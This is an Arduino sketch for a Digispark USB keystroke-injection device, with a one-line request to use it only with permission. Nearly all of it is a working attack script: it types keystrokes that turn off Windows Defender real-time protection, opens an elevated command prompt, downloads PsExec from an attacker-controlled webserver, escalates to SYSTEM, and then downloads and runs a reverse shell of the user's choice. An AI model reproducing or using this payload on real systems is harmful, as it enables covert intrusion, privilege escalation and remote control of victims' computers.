#include "DigiKeyboard.h"
// Basic Reverse Shell Injection. Turns off Windows Defender live checking manually then downloads PSEXEC from your webserver, 
// runs it, then finally downloads a reverse shell of your choice and runs it.
// You can adjust the delays how you like, I found that these delays work with slower and faster computers. Ideally 
// a fast computer with fast internet would allow all delays to be 100 however that is not the case. 
// Please use this in your own environment or in an environment that you have been granted permission.
void setup() {
  pinMode(1,OUTPUT);//Basic setup for light output.
}
//Admin CMD Through powershell
void cmd() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("powershell  Start-Process cmd -Verb runAs");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
int i = 0;

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  digitalWrite(1, HIGH);//turns on light in order to notify the script began
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Windows Security");//Opens windows defender
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);//Enters "Virus and Threat Protetion"
  DigiKeyboard.delay(1500);
  while( i <4) {
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN, MOD_ALT_LEFT);//Scrolls down to "manage" for realtime protection
    i = i +1;
  }
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);//Disables realtime protection
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);//If it requires an admin pop up, this closes it. It just backs up to the page before
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(6000);//closes windows defender and waits 6 seconds because some pcs have notifications that interupt the next part.
  cmd();
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("powershell \"((New-Object Net.Webclient).DownloadFile('[YOUR WEBSERVER(HOST PSEXEC)], 'C:/WINDOWS/system32/psexec.exe'))\"");//downloads PSEXEC
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("psexec.exe -i -s CMD");//Privlige escalates 
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("powershell \"(New-Object Net.WebClient).DownloadFile('[YOUR WEBSERVER','C:/WINDOWS/system32/[EXPLOIT NAME]')\"");//Downloads reverse shell
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("[EXPLOIT NAME]");//runs the shell
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);//closes everything
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  digitalWrite(1, LOW);
  for(;;) {
  }
}
